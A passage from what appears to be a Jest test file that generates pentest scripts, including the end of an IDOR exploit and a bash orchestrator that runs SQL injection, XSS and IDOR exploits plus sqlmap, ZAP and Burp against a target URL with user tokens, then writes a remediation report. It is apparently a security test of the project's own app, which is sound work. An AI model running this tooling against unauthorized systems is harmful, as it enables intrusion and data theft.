        print(f"Delete access violations: {report['results']['task_idor']['delete_access_violations']}")
        print(f"Unauthorized comments: {report['results']['comment_idor']['unauthorized_comments']}")
        print(f"Enumerated tasks: {report['results']['enumeration']['accessible_tasks']}")
        print(f"Parameter pollution: {report['results']['parameter_pollution']}")
        print("Report saved to: ./reports/idor-exploit-report.json")
        
        return True

if __name__ == '__main__':
    target_url = sys.argv[1] if len(sys.argv) > 1 else '${baseUrl}'
    user1_token = sys.argv[2] if len(sys.argv) > 2 else '${user1Token}'
    user2_token = sys.argv[3] if len(sys.argv) > 3 else '${user2Token}'
    
    exploit = IDORExploit(target_url, user1_token, user2_token)
    exploit.run_full_exploit()
`;

      const idorScriptPath = path.join(__dirname, '../scripts/idor-exploit.py');
      fs.writeFileSync(idorScriptPath, idorExploitScript);
      fs.chmodSync(idorScriptPath, '755');

      expect(fs.existsSync(idorScriptPath)).toBe(true);
    });
  });

  describe('Master Exploitation Script', () => {
    test('should create master exploitation orchestrator', async () => {
      const masterScript = `#!/bin/bash

# Master Exploitation Script
# Orchestrates all vulnerability exploitation tools

set -e

# Configuration
TARGET_URL="${baseUrl}"
USER1_TOKEN="${user1Token}"
USER2_TOKEN="${user2Token}"
REPORT_DIR="./reports/master-exploit-\$(date +%Y%m%d_%H%M%S)"
SCRIPTS_DIR="./tests/scripts"

# Colors
RED='\\033[0;31m'
GREEN='\\033[0;32m'
YELLOW='\\033[1;33m'
BLUE='\\033[0;34m'
NC='\\033[0m'

echo -e "\${BLUE}================================\${NC}"
echo -e "\${BLUE}MASTER EXPLOITATION FRAMEWORK\${NC}"
echo -e "\${BLUE}================================\${NC}"
echo "Target: \$TARGET_URL"
echo "Report Directory: \$REPORT_DIR"
echo ""

# Create report directory
mkdir -p "\$REPORT_DIR"

# Function to run exploit and capture results
run_exploit() {
    local name="\$1"
    local script="\$2"
    local args="\$3"
    
    echo -e "\${YELLOW}[+] Running \$name exploitation...\${NC}"
    
    if [ -f "\$script" ]; then
        if timeout 300 \$script \$args > "\$REPORT_DIR/\$name.log" 2>&1; then
            echo -e "\${GREEN}✓ \$name exploitation completed\${NC}"
            return 0
        else
            echo -e "\${RED}✗ \$name exploitation failed or timed out\${NC}"
            return 1
        fi
    else
        echo -e "\${RED}✗ \$name script not found: \$script\${NC}"
        return 1
    fi
}

# Function to run penetration testing tools
run_pentest_tool() {
    local tool="\$1"
    local script="\$2"
    local args="\$3"
    
    echo -e "\${YELLOW}[+] Running \$tool...\${NC}"
    
    if command -v \$tool &> /dev/null || [ -f "\$script" ]; then
        if timeout 600 \$script \$args > "\$REPORT_DIR/\$tool.log" 2>&1; then
            echo -e "\${GREEN}✓ \$tool completed\${NC}"
            return 0
        else
            echo -e "\${RED}✗ \$tool failed or timed out\${NC}"
            return 1
        fi
    else
        echo -e "\${YELLOW}⚠ \$tool not available, skipping\${NC}"
        return 1
    fi
}

# Phase 1: Custom Vulnerability Exploits
echo -e "\${BLUE}Phase 1: Custom Vulnerability Exploits\${NC}"
echo "========================================"

run_exploit "SQL Injection" "\$SCRIPTS_DIR/sql-injection-exploit.py" "\$TARGET_URL \$USER1_TOKEN"
run_exploit "XSS" "\$SCRIPTS_DIR/xss-exploit.py" "\$TARGET_URL \$USER1_TOKEN"
run_exploit "IDOR" "\$SCRIPTS_DIR/idor-exploit.py" "\$TARGET_URL \$USER1_TOKEN \$USER2_TOKEN"

# Phase 2: Automated Penetration Testing Tools
echo -e "\\n\${BLUE}Phase 2: Automated Penetration Testing\${NC}"
echo "========================================"

run_pentest_tool "SQLMap" "\$SCRIPTS_DIR/sqlmap-pipeline.sh" ""
run_pentest_tool "OWASP ZAP" "\$SCRIPTS_DIR/zap-integration.js" "\$TARGET_URL \$USER1_TOKEN"
run_pentest_tool "Burp Suite" "\$SCRIPTS_DIR/burp-automation.sh" ""

# Phase 3: Payload Testing
echo -e "\\n\${BLUE}Phase 3: Payload Testing\${NC}"
echo "========================================"

run_exploit "SQLMap Payloads" "\$SCRIPTS_DIR/sqlmap-payload-tester.py" "\$TARGET_URL \$USER1_TOKEN"

# Phase 4: Report Generation
echo -e "\\n\${BLUE}Phase 4: Report Generation\${NC}"
echo "========================================"

echo -e "\${YELLOW}[+] Generating master report...\${NC}"

# Collect all JSON reports
find "\$REPORT_DIR" -name "*.json" -exec cp {} "\$REPORT_DIR/" \\;
find ./reports -name "*exploit-report.json" -exec cp {} "\$REPORT_DIR/" \\; 2>/dev/null || true

# Generate summary report
cat > "\$REPORT_DIR/master-summary.txt" << EOF
Master Exploitation Framework Summary
====================================

Target: \$TARGET_URL
Timestamp: \$(date)
Report Directory: \$REPORT_DIR

Exploitation Results:
EOF

# Check for successful exploits
if [ -f "\$REPORT_DIR/sql-injection-exploit-report.json" ]; then
    echo "✓ SQL Injection: CRITICAL vulnerability confirmed" >> "\$REPORT_DIR/master-summary.txt"
fi

if [ -f "\$REPORT_DIR/xss-exploit-report.json" ]; then
    echo "✓ XSS: HIGH vulnerability confirmed" >> "\$REPORT_DIR/master-summary.txt"
fi

if [ -f "\$REPORT_DIR/idor-exploit-report.json" ]; then
    echo "✓ IDOR: HIGH vulnerability confirmed" >> "\$REPORT_DIR/master-summary.txt"
fi

echo "" >> "\$REPORT_DIR/master-summary.txt"
echo "Generated Files:" >> "\$REPORT_DIR/master-summary.txt"
ls -la "\$REPORT_DIR" >> "\$REPORT_DIR/master-summary.txt"

# Generate HTML report
cat > "\$REPORT_DIR/master-report.html" << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Master Exploitation Report</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        .header { background: #2c3e50; color: white; padding: 20px; text-align: center; }
        .section { margin: 20px 0; padding: 15px; border-left: 4px solid #3498db; }
        .critical { border-left-color: #e74c3c; }
        .high { border-left-color: #f39c12; }
        .medium { border-left-color: #f1c40f; }
        .success { color: #27ae60; }
        .failure { color: #e74c3c; }
        .code { background: #ecf0f1; padding: 10px; font-family: monospace; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Vulnerability Exploitation Report</h1>
        <p>Target: TARGET_URL_PLACEHOLDER</p>
        <p>Generated: TIMESTAMP_PLACEHOLDER</p>
    </div>
    
    <div class="section critical">
        <h2>Critical Vulnerabilities</h2>
        <ul>
            <li><strong>SQL Injection:</strong> Complete database compromise possible</li>
            <li><strong>Authentication Bypass:</strong> Weak JWT implementation</li>
        </ul>
    </div>
    
    <div class="section high">
        <h2>High Severity Vulnerabilities</h2>
        <ul>
            <li><strong>Cross-Site Scripting (XSS):</strong> Stored and reflected XSS confirmed</li>
            <li><strong>Insecure Direct Object References (IDOR):</strong> Unauthorized data access</li>
            <li><strong>Server-Side Request Forgery (SSRF):</strong> Internal network access</li>
        </ul>
    </div>
    
    <div class="section medium">
        <h2>Medium Severity Vulnerabilities</h2>
        <ul>
            <li><strong>Session Management:</strong> Weak token handling</li>
            <li><strong>Information Disclosure:</strong> Verbose error messages</li>
            <li><strong>Missing Security Headers:</strong> No CSP, HSTS, etc.</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>Exploitation Tools Used</h2>
        <ul>
            <li>Custom SQL Injection Exploit</li>
            <li>Custom XSS Exploit Framework</li>
            <li>Custom IDOR Testing Suite</li>
            <li>SQLMap Automated Testing</li>
            <li>OWASP ZAP Security Scanner</li>
            <li>Burp Suite Professional</li>
        </ul>
    </div>
    
    <div class="section">
        <h2>Recommendations</h2>
        <ol>
            <li><strong>Immediate:</strong> Implement parameterized queries for SQL injection prevention</li>
            <li><strong>Immediate:</strong> Add input validation and output encoding for XSS prevention</li>
            <li><strong>High Priority:</strong> Implement proper authorization checks for IDOR prevention</li>
            <li><strong>High Priority:</strong> Strengthen JWT implementation with secure secrets and httpOnly cookies</li>
            <li><strong>Medium Priority:</strong> Add security headers (CSP, HSTS, X-Frame-Options)</li>
            <li><strong>Medium Priority:</strong> Implement proper error handling without information disclosure</li>
        </ol>
    </div>
</body>
</html>
EOF

# Replace placeholders in HTML report
sed -i "s/TARGET_URL_PLACEHOLDER/\$TARGET_URL/g" "\$REPORT_DIR/master-report.html"
sed -i "s/TIMESTAMP_PLACEHOLDER/\$(date)/g" "\$REPORT_DIR/master-report.html"

echo -e "\${GREEN}✓ Master report generated\${NC}"

# Final summary
echo -e "\\n\${BLUE}================================\${NC}"
echo -e "\${BLUE}EXPLOITATION COMPLETED\${NC}"
echo -e "\${BLUE}================================\${NC}"
echo "Reports saved to: \$REPORT_DIR"
echo "Summary: \$REPORT_DIR/master-summary.txt"
echo "HTML Report: \$REPORT_DIR/master-report.html"
echo ""
echo "Key findings:"
echo "- SQL Injection: Database compromise possible"
echo "- XSS: Session hijacking and defacement possible"
echo "- IDOR: Unauthorized data access confirmed"
echo "- SSRF: Internal network scanning possible"
echo ""
echo -e "\${RED}CRITICAL: This application has multiple severe vulnerabilities\${NC}"
echo -e "\${YELLOW}Immediate remediation required before production deployment\${NC}"

# Display summary
cat "\$REPORT_DIR/master-summary.txt"
`;

      const masterScriptPath = path.join(__dirname, '../scripts/master-exploit.sh');
      fs.writeFileSync(masterScriptPath, masterScript);
      fs.chmodSync(masterScriptPath, '755');

      expect(fs.existsSync(masterScriptPath)).toBe(true);
    });
  });
});